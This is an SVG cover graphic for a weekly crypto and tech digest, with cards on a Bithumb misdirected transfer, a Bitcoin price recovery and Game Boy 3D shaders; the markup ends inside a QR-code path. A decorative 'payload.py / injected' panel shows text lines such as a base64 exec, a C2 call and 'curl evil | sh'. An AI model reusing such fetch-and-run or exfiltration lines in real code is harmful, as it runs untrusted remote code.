<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 630" width="1200" height="630" role="img" aria-label="Weekly digest cover 2026.02.09: 4.4B USD Misdirected, Bitcoin $71K Recovery, GameBoy 3D Shaders">
<!-- profile: high-quality-cover (L20 Hero+2-Card) -->
<title>Blockchain 2026-02-09: Bithumb $4.4B misdirected, Bitcoin $71K, GBA shaders</title>
<defs><linearGradient id="bgSpread" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#0B1326"/><stop offset="55%" stop-color="#0D1530"/><stop offset="100%" stop-color="#141034"/></linearGradient><linearGradient id="heroPanel" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#1A0A08"/><stop offset="100%" stop-color="#110608"/></linearGradient><linearGradient id="heroPanelBlue" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#0A1A30"/><stop offset="100%" stop-color="#071426"/></linearGradient><linearGradient id="heroPanelAmber" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#1A1208"/><stop offset="100%" stop-color="#120E06"/></linearGradient><linearGradient id="heroPanelGreen" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#08160E"/><stop offset="100%" stop-color="#04100A"/></linearGradient><linearGradient id="heroPanelPurple" x1="0%" y1="0%" x2="0%" y2="100%"><stop offset="0%" stop-color="#110629"/><stop offset="100%" stop-color="#0A0418"/></linearGradient><radialGradient id="hotRed" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#E63946" stop-opacity="0.6"/><stop offset="100%" stop-color="#E63946" stop-opacity="0"/></radialGradient><radialGradient id="hotBlue" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#3A86FF" stop-opacity="0.5"/><stop offset="100%" stop-color="#3A86FF" stop-opacity="0"/></radialGradient><radialGradient id="hotAmber" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#FFB703" stop-opacity="0.45"/><stop offset="100%" stop-color="#FFB703" stop-opacity="0"/></radialGradient><radialGradient id="hotGreen" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#4ADE80" stop-opacity="0.45"/><stop offset="100%" stop-color="#4ADE80" stop-opacity="0"/></radialGradient><radialGradient id="hotPurple" cx="50%" cy="50%" r="50%"><stop offset="0%" stop-color="#A78BFA" stop-opacity="0.45"/><stop offset="100%" stop-color="#A78BFA" stop-opacity="0"/></radialGradient><pattern id="envGrid" x="0" y="0" width="40" height="40" patternUnits="userSpaceOnUse"><circle cx="20" cy="20" r="0.8" fill="#2A3256" opacity="0.55"/></pattern><filter id="softShadow" x="-10%" y="-10%" width="130%" height="130%"><feGaussianBlur in="SourceAlpha" stdDeviation="3"/><feOffset dx="2" dy="4"/><feComponentTransfer><feFuncA type="linear" slope="0.55"/></feComponentTransfer><feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge></filter><filter id="textShadow" x="-10%" y="-10%" width="130%" height="130%"><feGaussianBlur in="SourceAlpha" stdDeviation="1.2"/><feOffset dx="1" dy="1.5"/><feComponentTransfer><feFuncA type="linear" slope="0.7"/></feComponentTransfer><feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge></filter></defs>
<rect width="1200" height="630" fill="url(#bgSpread)"/>
<rect width="1200" height="630" fill="url(#envGrid)"/>
<circle cx="310" cy="310" r="160" fill="url(#hotRed)"><animate attributeName="opacity" values="0.6;1;0.6" dur="5.8s" repeatCount="indefinite"/></circle><circle cx="950" cy="210" r="120" fill="url(#hotBlue)"><animate attributeName="opacity" values="0.45;0.85;0.45" dur="6.4s" repeatCount="indefinite"/></circle><circle cx="970" cy="480" r="110" fill="url(#hotAmber)"><animate attributeName="opacity" values="0.4;0.75;0.4" dur="7.1s" repeatCount="indefinite"/></circle><g fill="#8FB8FF"><circle cx="180" cy="70" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="3.4s" repeatCount="indefinite"/></circle><circle cx="440" cy="62" r="1"><animate attributeName="opacity" values="0.2;0.9;0.2" dur="4.2s" repeatCount="indefinite"/></circle><circle cx="740" cy="68" r="1.3"><animate attributeName="opacity" values="0.25;1;0.25" dur="3.9s" repeatCount="indefinite"/></circle><circle cx="1060" cy="74" r="0.9"><animate attributeName="opacity" values="0.2;0.85;0.2" dur="5.1s" repeatCount="indefinite"/></circle><circle cx="90" cy="580" r="1"><animate attributeName="opacity" values="0.15;0.8;0.15" dur="4.7s" repeatCount="indefinite"/></circle><circle cx="550" cy="590" r="0.8"><animate attributeName="opacity" values="0.2;0.75;0.2" dur="3.6s" begin="0.5s" repeatCount="indefinite"/></circle></g>
<g fill="#7DA3D9" opacity="0.85"><circle cx="252" cy="58" r="0.8"><animate attributeName="opacity" values="0.15;0.7;0.15" dur="4.3s" repeatCount="indefinite"/></circle><circle cx="368" cy="74" r="0.9"><animate attributeName="opacity" values="0.2;0.85;0.2" dur="3.8s" begin="0.4s" repeatCount="indefinite"/></circle><circle cx="624" cy="60" r="1.1"><animate attributeName="opacity" values="0.25;0.95;0.25" dur="4.5s" repeatCount="indefinite"/></circle><circle cx="858" cy="68" r="0.9"><animate attributeName="opacity" values="0.2;0.8;0.2" dur="3.6s" begin="0.6s" repeatCount="indefinite"/></circle><circle cx="996" cy="62" r="1.0"><animate attributeName="opacity" values="0.2;0.9;0.2" dur="4.0s" begin="0.2s" repeatCount="indefinite"/></circle><circle cx="1138" cy="76" r="0.8"><animate attributeName="opacity" values="0.15;0.7;0.15" dur="5.2s" begin="0.5s" repeatCount="indefinite"/></circle><circle cx="218" cy="596" r="0.9"><animate attributeName="opacity" values="0.18;0.75;0.18" dur="4.6s" begin="0.3s" repeatCount="indefinite"/></circle><circle cx="380" cy="608" r="1.0"><animate attributeName="opacity" values="0.2;0.85;0.2" dur="3.9s" begin="0.7s" repeatCount="indefinite"/></circle><circle cx="704" cy="600" r="0.8"><animate attributeName="opacity" values="0.18;0.7;0.18" dur="4.2s" begin="0.4s" repeatCount="indefinite"/></circle><circle cx="892" cy="608" r="1.1"><animate attributeName="opacity" values="0.22;0.9;0.22" dur="4.7s" begin="0.6s" repeatCount="indefinite"/></circle><circle cx="1078" cy="600" r="0.9"><animate attributeName="opacity" values="0.2;0.85;0.2" dur="3.6s" begin="0.8s" repeatCount="indefinite"/></circle></g>
<rect x="0" y="0" width="1200" height="56" fill="#050813" opacity="0.92"/>
<text x="36" y="36" font-family="Inter, Helvetica, Arial, sans-serif" font-size="18" font-weight="700" fill="#8FB8FF" letter-spacing="2.5">WEEKLY DIGEST</text>
<text x="1164" y="36" font-family="Inter, Helvetica, Arial, sans-serif" font-size="15" font-weight="600" fill="#7DA3D9" letter-spacing="1.5" text-anchor="end">2026.02.09</text>
<rect x="0" y="54" width="1200" height="2" fill="#E63946" opacity="0.85"><animate attributeName="opacity" values="0.4;1;0.4" dur="4.8s" repeatCount="indefinite"/></rect>
<rect x="32" y="80" width="600" height="510" rx="14" ry="14" fill="url(#heroPanel)" stroke="#E63946" stroke-width="1.8" opacity="0.98"/>
<circle cx="160" cy="300" r="240" fill="url(#hotRed)" opacity="0.28"/>
<rect x="32" y="80" width="600" height="4" fill="#E63946" opacity="0.85"><animate attributeName="opacity" values="0.5;1;0.5" dur="3.4s" repeatCount="indefinite"/></rect>
<g filter="url(#textShadow)">
<text x="54" y="112" font-family="Inter, Helvetica, Arial, sans-serif" font-size="13" font-weight="700" fill="#F87171" letter-spacing="3">BITHUMB  /  01</text>
<text x="54" y="146" font-family="Inter, Helvetica, Arial, sans-serif" font-size="31" font-weight="800" fill="#F8FAFC">4.4B USD Misdirected</text>
<text x="54" y="174" font-family="Inter, Helvetica, Arial, sans-serif" font-size="17" font-weight="500" fill="#FBB6BD">Bithumb 4.4 billion USD bitcoin misdirected transaction</text>
</g>
<g transform="translate(332,360)" opacity="0.32"><circle r="180" fill="none" stroke="#E63946" stroke-width="0.6" stroke-dasharray="2 4"/><circle r="140" fill="none" stroke="#E63946" stroke-width="0.6" stroke-dasharray="2 4" opacity="0.7"/><circle r="100" fill="none" stroke="#E63946" stroke-width="0.6" stroke-dasharray="2 4" opacity="0.5"/><g><path d="M0 0 L180 0 A180 180 0 0 1 127 127 Z" fill="#E63946" opacity="0.10"/><animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="14s" repeatCount="indefinite"/></g></g>
<g stroke="#E63946" stroke-width="1.4" fill="none" opacity="0.7"><path d="M36 96 L36 84 L48 84"/><path d="M616 84 L628 84 L628 96"/><path d="M36 574 L36 586 L48 586"/><path d="M616 586 L628 586 L628 574"/></g>
<g><rect x="54" y="526" width="280" height="1" fill="#E63946" opacity="0.35"/><rect x="54" y="528" width="1" height="4" fill="#E63946" opacity="0.55"/><rect x="68" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="82" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="96" y="528" width="1" height="4" fill="#E63946" opacity="0.55"/><rect x="110" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="124" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="138" y="528" width="1" height="4" fill="#E63946" opacity="0.55"/><rect x="152" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="166" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="180" y="528" width="1" height="4" fill="#E63946" opacity="0.55"/><rect x="194" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="208" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="222" y="528" width="1" height="4" fill="#E63946" opacity="0.55"/><rect x="236" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="250" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="264" y="528" width="1" height="4" fill="#E63946" opacity="0.55"/><rect x="278" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="292" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="306" y="528" width="1" height="4" fill="#E63946" opacity="0.55"/><rect x="320" y="528" width="1" height="2" fill="#E63946" opacity="0.55"/><rect x="284" y="527" width="50" height="6" fill="#E63946" opacity="0.45"><animate attributeName="x" values="54;284;54" dur="6.4s" repeatCount="indefinite"/><animate attributeName="opacity" values="0.2;0.7;0.2" dur="6.4s" repeatCount="indefinite"/></rect></g>
<g transform="translate(332,360)"><g transform="translate(-160,-50)" filter="url(#softShadow)"><ellipse cx="40" cy="6" rx="40" ry="8" fill="#0A1B2E" stroke="#2CCCE4" stroke-width="1.6"/><rect x="0" y="6" width="80" height="56" fill="#0A1B2E" stroke="#2CCCE4" stroke-width="1.6"/><ellipse cx="40" cy="62" rx="40" ry="8" fill="#0A1B2E" stroke="#2CCCE4" stroke-width="1.6"/><ellipse cx="40" cy="22" rx="40" ry="6" fill="none" stroke="#2CCCE4" stroke-width="0.8" opacity="0.6"/><ellipse cx="40" cy="40" rx="40" ry="6" fill="none" stroke="#2CCCE4" stroke-width="0.8" opacity="0.6"/><text x="40" y="84" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#2CCCE4">DB / S3</text><text x="40" y="98" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="600" fill="#7ED4E5">PII  /  secrets</text></g><g transform="translate(80,-50)" filter="url(#softShadow)"><rect x="0" y="0" width="80" height="80" rx="8" fill="#1E0A0A" stroke="#E63946" stroke-width="2"/><text x="40" y="22" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="900" fill="#F87171">ATTACKER</text><g transform="translate(20,32)" stroke="#F87171" stroke-width="1.6" fill="none"><circle cx="20" cy="10" r="8"/><path d="M6 32 Q20 22 34 32"/></g><text x="40" y="74" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="700" fill="#FCA5A5">offshore relay</text></g><g stroke="#E63946" stroke-width="1.4" stroke-dasharray="4 3" fill="none"><path d="M-80 -10 L80 -10"><animate attributeName="stroke-dashoffset" values="0;-14" dur="1.2s" repeatCount="indefinite"/></path><path d="M-80 0 L80 0"><animate attributeName="stroke-dashoffset" values="0;-14" dur="1.4s" begin="0.2s" repeatCount="indefinite"/></path><path d="M-80 10 L80 10"><animate attributeName="stroke-dashoffset" values="0;-14" dur="1s" begin="0.4s" repeatCount="indefinite"/></path></g><g fill="#F87171"><circle r="2.4"><animateMotion path="M-80 -10 L80 -10" dur="2s" repeatCount="indefinite"/></circle><circle r="2.4"><animateMotion path="M-80 0 L80 0" dur="2.2s" begin="0.4s" repeatCount="indefinite"/></circle><circle r="2.4"><animateMotion path="M-80 10 L80 10" dur="2.4s" begin="0.8s" repeatCount="indefinite"/></circle></g><text x="0" y="40" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" fill="#E63946" letter-spacing="2">DATA EXFILTRATION</text></g>
<g transform="translate(54,548)">
<rect x="0" y="0" width="280" height="24" rx="3" fill="#E63946" opacity="0.95"/>
<text x="140" y="17" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#FFFFFF">REVIEW TX SIGN-OFF + 4 EYES</text>
</g>
<text x="350" y="566" font-family="Inter, Helvetica, Arial, sans-serif" font-size="13" font-weight="600" fill="#A5B4C4" font-style="italic">Weekly Digest  /  2026.02.09</text>
<rect x="652" y="80" width="516" height="248" rx="14" ry="14" fill="url(#heroPanelAmber)" stroke="#FFB703" stroke-width="1.6" opacity="0.97"/>
<rect x="652" y="80" width="516" height="4" fill="#FFB703" opacity="0.85"><animate attributeName="opacity" values="0.5;1;0.5" dur="4.2s" repeatCount="indefinite"/></rect>
<g filter="url(#textShadow)">
<text x="670" y="110" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#FFB703" letter-spacing="3">BTC 71K  /  02</text>
<text x="670" y="140" font-family="Inter, Helvetica, Arial, sans-serif" font-size="24" font-weight="800" fill="#F5F7FA">Bitcoin $71K Recovery</text>
<text x="670" y="163" font-family="Inter, Helvetica, Arial, sans-serif" font-size="14" font-weight="500" fill="#FFD58A">Bitcoin recovers to 71K USD on institutional buying</text>
</g>
<g stroke="#FFB703" stroke-width="1.4" fill="none" opacity="0.7"><path d="M656 93 L656 84 L665 84"/><path d="M1155 84 L1164 84 L1164 93"/><path d="M656 315 L656 324 L665 324"/><path d="M1155 324 L1164 324 L1164 315"/></g>
<g transform="translate(800,230)"><circle cx="0" cy="0" r="30" fill="#0A1540" stroke="#FFB703" stroke-width="2" filter="url(#softShadow)"><animate attributeName="r" values="28;34;28" dur="3.2s" repeatCount="indefinite"/></circle><text x="0" y="2" text-anchor="middle" font-family="Inter, monospace" font-size="11" font-weight="900" fill="#FFD58A">BTC</text><text x="0" y="16" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="700" fill="#FFB703">HUB</text><g stroke="#FFB703" stroke-width="1" stroke-dasharray="3 2" fill="none" opacity="0.6"><line x1="0" y1="0" x2="90" y2="-55"/><line x1="0" y1="0" x2="108" y2="0"/><line x1="0" y1="0" x2="90" y2="55"/><line x1="0" y1="0" x2="-90" y2="55"/><line x1="0" y1="0" x2="-108" y2="0"/><line x1="0" y1="0" x2="-90" y2="-55"/></g><g font-family="Inter, monospace" font-size="7" font-weight="800"><g transform="translate(92,-58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#FFB703" stroke-width="1.2"/><g transform="translate(-18,-8)" stroke="#FFD58A" stroke-width="0.9" fill="none"><rect x="0" y="0" width="9" height="5" rx="1"/><circle cx="2" cy="2.5" r="0.6" fill="#FFB703"/><circle cx="5" cy="2.5" r="0.6" fill="#FFB703"/></g><text x="3" y="2" text-anchor="middle" fill="#FFD58A">EDGE-1</text><circle cx="20" cy="-8" r="4" fill="#E63946"><animate attributeName="opacity" values="0.4;1;0.4" dur="1.6s" repeatCount="indefinite"/></circle></g><g transform="translate(112,0)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#FFB703" stroke-width="1.2"/><g transform="translate(-18,-8)" stroke="#FFD58A" stroke-width="0.9" fill="none"><rect x="0" y="0" width="9" height="5" rx="1"/><circle cx="2" cy="2.5" r="0.6" fill="#FFB703"/><circle cx="5" cy="2.5" r="0.6" fill="#FFB703"/></g><text x="3" y="2" text-anchor="middle" fill="#FFD58A">EDGE-2</text><circle cx="20" cy="-8" r="4" fill="#E63946"><animate attributeName="opacity" values="0.4;1;0.4" dur="2s" begin="0.3s" repeatCount="indefinite"/></circle></g><g transform="translate(92,58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#FFB703" stroke-width="1.2"/><g transform="translate(-18,-4)" stroke="#FFD58A" stroke-width="0.9" fill="none"><path d="M2 4 L0 0 M2 4 L4 0 M2 4 L2 8"/></g><text x="4" y="2" text-anchor="middle" fill="#FFD58A">RELAY</text></g><g transform="translate(-92,58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#FFB703" stroke-width="1.2"/><g transform="translate(-19,-3)" stroke="#FFD58A" stroke-width="0.9" fill="none"><path d="M0 3 L4 0 L4 6 Z" fill="#FFD58A"/></g><text x="4" y="2" text-anchor="middle" fill="#FFD58A">PROXY</text></g><g transform="translate(-112,0)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#4ADE80" stroke-width="1.2"/><g transform="translate(-19,-6)" stroke="#4ADE80" stroke-width="0.9" fill="none"><rect x="0" y="0" width="8" height="5" rx="0.6"/><path d="M-1 7 L9 7"/></g><text x="4" y="2" text-anchor="middle" fill="#4ADE80">VICTIM</text></g><g transform="translate(-92,-58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#4ADE80" stroke-width="1.2"/><g transform="translate(-19,-4)" stroke="#4ADE80" stroke-width="0.9" fill="none"><circle cx="2" cy="3" r="1.6"/><path d="M3.5 3 L9 3 M7 3 L7 5"/></g><text x="4" y="2" text-anchor="middle" fill="#4ADE80">CREDS</text></g></g><g fill="#FFD58A"><circle r="2.2"><animateMotion path="M0 0 L90 -55" dur="2s" repeatCount="indefinite"/></circle><circle r="2.2"><animateMotion path="M0 0 L108 0" dur="1.8s" begin="0.3s" repeatCount="indefinite"/></circle><circle r="2.2"><animateMotion path="M0 0 L90 55" dur="2.2s" begin="0.6s" repeatCount="indefinite"/></circle><circle r="2.2"><animateMotion path="M0 0 L-90 55" dur="2.4s" begin="0.9s" repeatCount="indefinite"/></circle><circle r="2.2"><animateMotion path="M0 0 L-108 0" dur="1.9s" begin="1.2s" repeatCount="indefinite"/></circle><circle r="2.2"><animateMotion path="M0 0 L-90 -55" dur="2.1s" begin="1.5s" repeatCount="indefinite"/></circle></g></g>
<g transform="translate(1094,168)" filter="url(#softShadow)"><rect x="-68" y="-55" width="140" height="110" rx="10" fill="#1A1208" stroke="#FFB703" stroke-width="2"/><text x="2" y="-28" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" letter-spacing="2" fill="#FFB703">BTC</text><text x="2" y="18" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="28" font-weight="900" fill="#F5F7FA">71K</text><text x="2" y="40" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="600" fill="#FFD58A">inst</text></g>
<rect x="652" y="344" width="516" height="246" rx="14" ry="14" fill="url(#heroPanelBlue)" stroke="#3A86FF" stroke-width="1.6" opacity="0.97"/>
<rect x="652" y="344" width="516" height="4" fill="#3A86FF" opacity="0.85"><animate attributeName="opacity" values="0.5;1;0.5" dur="4.8s" repeatCount="indefinite"/></rect>
<g filter="url(#textShadow)">
<text x="670" y="374" font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" fill="#7DA3D9" letter-spacing="3">GBA SHADERS  /  03</text>
<text x="670" y="404" font-family="Inter, Helvetica, Arial, sans-serif" font-size="24" font-weight="800" fill="#F5F7FA">GameBoy 3D Shaders</text>
<text x="670" y="428" font-family="Inter, Helvetica, Arial, sans-serif" font-size="14" font-weight="500" fill="#BFC9D9">Game Boy 3D shader implementation case study and</text>
</g>
<g stroke="#3A86FF" stroke-width="1.4" fill="none" opacity="0.7"><path d="M656 357 L656 348 L665 348"/><path d="M1155 348 L1164 348 L1164 357"/><path d="M656 577 L656 586 L665 586"/><path d="M1155 586 L1164 586 L1164 577"/></g>
<g transform="translate(800,490)" filter="url(#softShadow)"><rect x="-150" y="-90" width="300" height="180" rx="8" fill="#0A0C16" stroke="#3A86FF" stroke-width="1.4"/><rect x="-150" y="-90" width="300" height="22" rx="8" fill="#1A1820"/><g transform="translate(-138,-79)"><circle cx="0" cy="0" r="3" fill="#E63946"/><circle cx="10" cy="0" r="3" fill="#FFB703"/><circle cx="20" cy="0" r="3" fill="#4ADE80"/></g><text x="0" y="-74" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="700" fill="#BFC9D9">payload.py  /  injected</text><g font-family="Inter, monospace" font-size="9" font-weight="600"><text x="-138" y="-50" fill="#7DA3D9">  1  import os, base64</text><text x="-138" y="-34" fill="#7DA3D9">  2  from urllib import request</text><text x="-138" y="-18" fill="#7DA3D9">  3</text><rect x="-148" y="-12" width="296" height="18" fill="#3A86FF" opacity="0.22"/><text x="-138" y="0" fill="#60A5FA">  4  exec(base64.b64decode(PAYLOAD))</text><text x="-138" y="16" fill="#7DA3D9">  5  request.urlopen(C2_URL)</text><text x="-138" y="32" fill="#7DA3D9">  6  os.system("curl evil | sh")</text><text x="-138" y="48" fill="#7DA3D9">  7  # exfil_keys()</text><text x="-138" y="64" fill="#7DA3D9">  8  # persist_cron()</text></g><g transform="translate(118,0)"><circle cx="0" cy="0" r="14" fill="#3A86FF" opacity="0.7"><animate attributeName="r" values="10;16;10" dur="1.4s" repeatCount="indefinite"/></circle><text x="0" y="3" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="900" fill="#FFFFFF">RCE</text></g><g fill="#60A5FA"><circle r="2"><animateMotion path="M120 0 L150 -40" dur="1.6s" repeatCount="indefinite"/></circle><circle r="2" opacity="0.7"><animateMotion path="M120 0 L150 -40" dur="1.6s" begin="0.5s" repeatCount="indefinite"/></circle></g></g>
<g transform="translate(1094,452)" filter="url(#softShadow)"><rect x="-68" y="-55" width="140" height="110" rx="10" fill="#071426" stroke="#3A86FF" stroke-width="2"/><text x="2" y="-28" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" letter-spacing="2" fill="#7DA3D9">3D</text><text x="2" y="18" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="28" font-weight="900" fill="#F5F7FA">GBA</text><text x="2" y="40" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="600" fill="#BFC9D9">shad</text></g>
<g opacity="0.85"><g fill="#F87171"><circle cx="1104" cy="110" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.8s" repeatCount="indefinite"/></circle><circle cx="1124" cy="110" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.4s" begin="0.3s" repeatCount="indefinite"/></circle></g><g fill="#7DA3D9"><circle cx="1104" cy="218" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="2s" repeatCount="indefinite"/></circle><circle cx="1124" cy="218" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.6s" begin="0.4s" repeatCount="indefinite"/></circle></g><g fill="#FFD58A"><circle cx="1104" cy="374" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.8s" repeatCount="indefinite"/></circle><circle cx="1124" cy="374" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.6s" begin="0.3s" repeatCount="indefinite"/></circle></g><g stroke="#E63946" stroke-width="0.5" fill="none"><path d="M20 230 L28 230"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2s" repeatCount="indefinite"/></path><path d="M20 300 L28 300"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2.3s" begin="0.3s" repeatCount="indefinite"/></path><path d="M20 370 L28 370"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="1.9s" begin="0.6s" repeatCount="indefinite"/></path><path d="M20 440 L28 440"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2.1s" begin="0.9s" repeatCount="indefinite"/></path></g></g>
<g transform="translate(1080,504)" filter="url(#softShadow)">
  <rect x="-8" y="-8" width="100" height="100" rx="6" fill="#FFFFFF"/>
  <path fill="#0A1020" d="M0.0 0.0h15.892v2.27h-15.892z M18.162 0.0h2.27v2.27h-2.27z M24.973 0.0h4.541v2.27h-4.541z M31.784 0.0h6.811v2.27h-6.811z M40.865 0.0h4.541v2.27h-4.541z M47.676 0.0h2.27v2.27h-2.27z M52.216 0.0h2.27v2.27h-2.27z M56.757 0.0h4.541v2.27h-4.541z M68.108 0.0h15.892v2.27h-15.892z M0.0 2.27h2.27v2.27h-2.27z M13.622 2.27h2.27v2.27h-2.27z M18.162 2.27h4.541v2.27h-4.541z M24.973 2.27h2.27v2.27h-2.27z M29.514 2.27h2.27v2.27h-2.27z M34.054 2.27h6.811v2.27h-6.811z M43.135 2.27h2.27v2.27h-2.27z M47.676 2.27h2.27v2.27h-2.27z M54.486 2.27h2.27v2.27h-2.27z M63.568 2.27h2.27v2.27h-2.27z M68.108 2.27h2.27v2.27h-2.27z M81.73 2.27h2.27v2.27h-2.27z M0.0 4.541h2.27v2.27h-2.27z M4.541 4.541h6.811v2.27h-6.811z M13.622 4.541h2.27v2.27h-2.27z M18.162 4.541h15.892v2.27h-15.892z M36.324 4.541h2.27v2.27h-2.27z M45.405 4.541h4.541v2.27h-4.541z M56.757 4.541h6.811v2.27h-6.811z M68.108 4.541h2.27v2.27h-2.27z M72.649 4.541h6.811v2.27h-6.811z M81.73 4.541h2.27v2.27h-2.27z M0.0 6.811h2.27v2.27h-2.27z M4.541 6.811h6.811v2.27h-6.811z M13.622 6.811h2.27v2.27h-2.27z M24.973 6.811h2.27v2.27h-2.27z M34.054 6.811h15.892v2.27h-15.892z M54.486 6.811h4.541v2.27h-4.541z M68.108 6.811h2.27v2.27h-2.27z M72.649 6.811h6.811v2.27h-6.811z M81.73 6.811h2.27v2.27h-2.27z M0.0 9.081h2.27v2.27h-2.27z M4.541 9.081h6.811v2.27h-6.811z M13.622 9.081h2.27v2.27h-2.27z M18.162 9.081h4.541v2.27h-4.541z M29.514 9.081h2.27v2.27h-2.27z M34.054 9.081h2.27v2.27h-2.27z M38.595 9.081h2.27v2.27h-2.27z M43.135 9.081h4.541v2.27h-4.541z M59.027 9.081h2.27v2.27h-2.27z M63.568 9.081h2.27v2.27h-2.27z M68.108 9.081h2.27v2.27h-2.27z M72.649 9.081h6.811v2.27h-6.811z M81.73 9.081h2.27v2.27h-2.27z M0.0 11.351h2.27v2.27h-2.27z M13.622 11.351h2.27v2.27h-2.27z M20.432 11.351h9.081v2.27h-9.081z M36.324 11.351h2.27v2.27h-2.27z M40.865 11.351h2.27v2.27h-2.27z M45.405 11.351h4.541v2.27h-4.541z M52.216 11.351h6.811v2.27h-6.811z M63.568 11.351h2.27v2.27h-2.27z M68.108 11.351h2.27v2.27h-2.27z M81.73 11.351h2.27v2.27h-2.27z M0.0 13.622h15.892v2.27h-15.892z M18.162 13.622h2.27v2.27h-2.27z M22.703 13.622h2.27v2.27h-2.27z M27.243 13.622h2.27v2.27h-2.27z M31.784 13.622h2.27v2.27h-2.27z M36.324 13.622h2.27v2.27h-2.27z M40.865 13.622h2.27v2.27h-2.27z M45.405 13.622h2.27v2.27h-2.27z M49.946 13.622h2.27v2.27h-2.27z M54.486 13.622h2.27v2.27h-2.27z M59.027 13.622h2.27v2.27h-2.27z M63.568 13.622h2.27v2.27h-2.27z M68.108 13.622h15.892v2.27h-15.892z M22.703 15.892h6.811v2.27h-6.811z M34.054 15.892h2.27v2.27h-2.27z M40.865 15.892h2.27v2.27h-2.27z M45.405 15.892h2.27v2.27h-2.27z M49.946 15.892h4.541v2.27h-4.541z M56.757 15.892h2.27v2.27h-2.27z M63.568 15.892h2.27v2.27h-2.27z M0.0 18.162h2.27v2.27h-2.27z M6.811 18.162h13.622v2.27h-13.622z M22.703 18.162h2.27v2.27h-2.27z M27.243 18.162h13.622v2.27h-13.622z M43.135 18.162h6.811v2.27h-6.811z M52.216 18.162h2.27v2.27h-2.27z M59.027 18.162h9.081v2.27h-9.081z M72.649 18.162h2.27v2.27h-2.27z M77.189 18.162h6.811v2.27h-6.811z M0.0 20.432h4.541v2.27h-4.541z M18.162 20.432h2.27v2.27h-2.27z M24.973 20.432h2.27v2.27h-2.27z M29.514 20.432h2.27v2.27h-2.27z M36.324 20.432h2.27v2.27h-2.27z M40.865 20.432h2.27v2.27h-2.27z M47.676 20.432h6.811v2.27h-6.811z M56.757 20.432h6.811v2.27h-6.811z M70.378 20.432h6.811v2.27h-6.811z M79.459 20.432h2.27v2.27h-2.27z M0.0 22.703h2.27v2.27h-2.27z M4.541 22.703h4.541v2.27h-4.541z M13.622 22.703h2.27v2.27h-2.27z M22.703 22.703h2.27v2.27h-2.27z M27.243 22.703h4.541v2.27h-4.541z M34.054 22.703h4.541v2.27h-4.541z M40.865 22.703h2.27v2.27h-2.27z M45.405 22.703h2.27v2.27h-2.27z M49.946 22.703h4.541v2.27h-4.541z M56.757 22.703h2.27v2.27h-2.27z M61.297 22.703h2.27v2.27h-2.27z M68.108 22.703h4.541v2.27h-4.541z M77.189 22.703h2.27v2.27h-2.27z M81.73 22.703h2.27v2.27h-2.27z M0.0 24.973h9.081v2.27h-9.081z M22.703 24.973h9.081v2.27h-9.081z M34.054 